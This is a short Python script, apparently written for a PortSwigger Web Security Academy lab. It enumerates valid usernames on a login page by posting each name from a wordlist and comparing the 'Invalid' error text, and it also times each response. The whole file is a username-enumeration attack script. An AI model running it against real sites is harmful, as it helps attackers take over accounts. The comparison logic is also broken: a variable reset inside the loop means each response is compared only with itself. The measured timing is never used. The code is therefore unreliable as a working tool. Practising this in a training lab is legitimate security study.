import requests
import time

# Define the URL
url = "https://0af800f2034b950a80c96294005100e9.web-security-academy.net/login"  # Replace with the actual URL

wordlist_path = "usernames.txt"

# Read the wordlist
with open(wordlist_path, 'r') as file:
    payloads = file.read().splitlines()

# Iterate over each payload in the wordlist
for payload in payloads:
    # Define the parameters for the POST request
    params = {'username': f'{payload}', 'password': 'password'}
    start = time.time()
    response = requests.post(url, data=params)
    end = time.time()
    diff = end - start
    
    if response.status_code == 200:
        response_text = response.text
        error_index = response_text.find("Invalid")
        temp = None
        if error_index != -1:
            start_index = max(0, error_index)
            end_index = min(len(response_text), error_index + 20)
            context = response_text[start_index:end_index]
            if temp == None:
                temp = context
            if context != temp:
                print(f"Payload: {payload}  response-length: {len(response.text)} | context: {context}")
            else:
                print(context==temp)
            temp = context
        else:
            print(f"Payload: {payload} | response-length: {len(response.text)} | 'error' not found")
    else:
        print(response.status_code)